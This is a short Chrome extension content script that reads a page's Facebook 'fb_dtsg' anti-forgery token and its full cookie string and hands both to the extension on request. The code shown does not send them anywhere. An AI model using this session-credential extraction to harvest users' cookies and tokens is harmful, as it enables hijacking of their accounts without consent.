function extractToken() {
    const elements = document.getElementsByName('fb_dtsg');

    if (elements.length > 0) {
        return elements[0].value
    }

    return ''
}

function extractCookie() {
    return document.cookie
}

chrome.runtime.onMessage.addListener(
    function (request, sender, sendResponse) {
        if (request.action === "BEGIN_EXTRACTION")
            sendResponse({
                action: "END_EXTRACTION",
                cookie: extractCookie(),
                token: extractToken()
            });
    });
